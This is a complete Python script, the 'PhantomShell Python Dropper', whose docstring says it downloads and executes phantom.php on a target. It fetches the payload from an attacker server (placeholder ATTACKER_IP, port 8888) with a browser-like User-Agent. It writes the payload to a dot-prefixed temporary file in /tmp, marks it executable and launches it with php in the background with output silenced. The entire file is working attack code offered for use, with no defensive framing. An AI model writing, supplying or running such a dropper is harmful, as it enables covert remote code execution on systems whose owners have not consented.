#!/usr/bin/env python3
"""PhantomShell Python Dropper
Downloads and executes phantom.php on the target.
"""
import subprocess
import tempfile
import os
import sys

ATTACKER_IP = "ATTACKER_IP"
HTTP_PORT = 8888
URL = f"http://{ATTACKER_IP}:{HTTP_PORT}/phantom.php"

def fetch(url):
    try:
        import urllib.request
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        return urllib.request.urlopen(req, timeout=10).read()
    except Exception:
        return None

def main():
    data = fetch(URL)
    if not data:
        print("[-] Failed to fetch payload")
        sys.exit(1)

    tmp = tempfile.NamedTemporaryFile(suffix='.php', delete=False, dir='/tmp', prefix='.c_')
    tmp.write(data)
    tmp.close()
    os.chmod(tmp.name, 0o755)

    print(f"[+] Downloaded {len(data)} bytes to {tmp.name}")
    subprocess.Popen(['php', tmp.name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Executed")

if __name__ == '__main__':
    main()
